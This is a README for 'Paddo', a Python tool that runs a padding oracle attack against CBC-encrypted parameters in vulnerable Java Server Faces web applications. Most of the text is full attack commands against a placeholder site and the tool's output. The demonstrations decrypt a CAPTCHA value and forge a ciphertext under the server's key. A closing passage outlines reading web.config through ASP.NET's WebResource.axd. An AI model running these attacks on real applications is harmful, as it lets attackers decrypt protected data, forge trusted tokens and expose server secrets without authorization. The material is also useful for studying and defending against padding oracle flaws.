Paddo
=====

Audit and attack the underlying cryptography in encrypted blocks for decrypting them or re-encrypting any plaintext without knowing the secret key. An "oracle" is when a service or machine receives a ciphertext, decrypts it and then replies to the sender whether the padding is correct or not. At Eurocrypt 2002, Vaudenay introduced a powerful side-channel attack against CBC-mode encryption with PKCS#5. This framework currently attacks Java Server Faces vulnerable versions and allows to extend current methods for beeing used in customized web applications.

For example:

http://[EXAMPLE_WEBSITE]/bzJApp/Captcha.action?securityWord=OdXdV/96yBv1hA2cfGnmFFsPhYFi2xCO

Here the ciphertext is: OdXdV/96yBv1hA2cfGnmFFsPhYFi2xCO (Which is the real value of the "security word" but encrypted)

lucas@debian:~$ ./paddo.py -t http://[EXAMPLE_WEBSITE]/bzJApp/Captcha.action?securityWord=OdXdV/96yBv1hA2cfGnmFFsPhYFi2xCO -p securityWord
[+] Detecting a Padding Oracle in parameter: securityWord
[+] Encoding Detected: base64
[+] Blocksize Detected: 8 bytes
[!] Sending our first block nulled payload
[!] JSF vulnerable to a Padding Oracle attack
[+] Decrypting block #: 2
[+] Original Block: f5840d9c7c69e614
[+] IV: 39d5dd57ff7ac81b
[+] Padding !
[!] Invalid Padding: 0000000000000000
[...]
[!] Valid Padding: bbd452917164eb19 5b0f858162db108e
[!] Intermediate Block: b3dc5a99796ce311
[*] Block decrypted: 4658570505050505
[!] Plaintext: 05190,ZRFXW

We successfully decrypted our ciphertext !

Paddo attemps to decrypt valid ciphertext on a service which acts as an "oracle". Obviously this service must know the key of the ciphertext since is the one who will check for proper padding after decrypting it due to PKCS#5.

Also paddo supports re-encryption (CBC-R), that is encrypting a custom plaintext with the server key without really knowing it. 

For example encrypting a "LUCAS" with paddo:

lucas@debian:~$ ./paddo.py -t http://[EXAMPLE_WEBSITE]/bzJApp/Captcha.action?securityWord=OdXdV/96yBv1hA2cfGnmFFsPhYFi2xCO -p securityWord --encrypt 05555,LUCAS
[...]
[*] Encrypting: 05555,LUCAS
[...]
[!] Valid Padding: 65b4cdb2be1e37d8 2b5c874bd1c94191
[!] Intermediate Block: 6dbcc5bab6163fd0
[*] Block decrypted: 6dbcc5bab6163fd0
[!] Ciphertext: XYnwj4M6c4UrXIdL0clBkQAAAAAAAAAA

If the Cookie image is feed by the securityWord parameter, we will see the word LUCAS in the CAPTCHA.

http://[EXAMPLE_WEBSITE]/bzJApp/Captcha.action?securityWord=XYnwj4M6c4UrXIdL0clBkQAAAAAAAAAA

This is the core of http://technet.microsoft.com/en-us/security/bulletin/MS10-070.

Briefly, you can encrypt a "web.config" string with the server secret key, and then feed the WebResource.axd script for fetching the content of that file. Currently paddo only attacks Java Server Faces, but it may be extended to also support ASP.NET since the attack is very similar.
